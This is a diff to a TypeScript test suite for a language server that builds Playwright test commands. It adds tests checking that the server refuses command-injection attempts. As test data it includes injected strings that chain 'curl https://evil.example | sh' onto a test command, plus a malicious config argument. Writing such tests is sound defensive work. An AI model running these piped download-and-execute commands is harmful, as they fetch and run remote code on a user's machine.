@@ -145,6 +145,10 @@ let laidOver: unknown = null;
 /** The fixture repository's one commit, which run #41 ran at: the files the failures are followed from. */
 let fixtureCommit = '';
 
+/** What the instance answers for a run's arguments and the smoke selection's command, once a test sets them. */
+let hostileMaterialization: unknown = null;
+let hostileSelectionCommand: string | null = null;
+
 /**
  * The API key of the service the tests of runs as they happen start: the stub streams the instance's events to that
  * key only, and is an instance without the route for every other.
@@ -494,7 +498,10 @@ beforeAll(async () => {
         {
           key: 'smoke',
           name: 'Smoke',
-          resolved: { testCaseIds: [1], command: 'npx playwright test tests/checkout.spec.ts:3' },
+          resolved: {
+            testCaseIds: [1],
+            command: hostileSelectionCommand ?? 'npx playwright test tests/checkout.spec.ts:3',
+          },
         },
         { key: 'failed', name: null, resolved: { testCaseIds: [3], command: 'npx playwright test --grep x' } },
       ];
@@ -601,7 +608,7 @@ beforeAll(async () => {
     if (u === '/api/projects/7/selections/preview') {
       return res.end(
         JSON.stringify({
-          materialization: {
+          materialization: hostileMaterialization ?? {
             args: ['tests/checkout.spec.ts:3'],
             command: 'npx playwright test tests/checkout.spec.ts:3',
           },
@@ -1087,7 +1094,7 @@ describe('the Piwi language server', () => {
     expect(selection).toEqual({
       cwd: dir,
       command: 'npx playwright test tests/checkout.spec.ts:3',
-      args: [],
+      args: ['tests/checkout.spec.ts:3'],
       env: { PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: selection.ref },
       ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
     });
@@ -1352,6 +1359,35 @@ describe('breakpoints', () => {
         edit: null,
       });
     }
+  });
+});
+
+describe('the command line of a run', () => {
+  afterAll(async () => {
+    hostileMaterialization = null;
+    hostileSelectionCommand = null;
+    await client.sendRequest('piwi/refresh');
+  });
+
+  const runArgs = () => client.sendRequest('piwi/runArgs', { uri: uri('tests/checkout.spec.ts'), testIds: [1] });
+
+  test("is built from the instance's arguments, never its command text", async () => {
+    hostileMaterialization = {
+      args: ['tests/checkout.spec.ts:3'],
+      command: 'npx playwright test tests/checkout.spec.ts:3; curl https://evil.example | sh',
+    };
+    expect(((await runArgs()) as RunCommand).command).toBe('npx playwright test tests/checkout.spec.ts:3');
+
+    hostileMaterialization = { args: ['--config=evil.config.ts'], command: 'npx playwright test' };
+    expect(await runArgs()).toBeNull();
+  });
+
+  test('is refused for a selection whose command is anything but npx playwright test and its arguments', async () => {
+    hostileSelectionCommand = 'npx playwright test tests/checkout.spec.ts:3 && curl https://evil.example';
+    await client.sendRequest('piwi/refresh');
+    expect(
+      await client.sendRequest('piwi/runSelection', { uri: uri('tests/checkout.spec.ts'), key: 'smoke' }),
+    ).toBeNull();
   });
 });
 
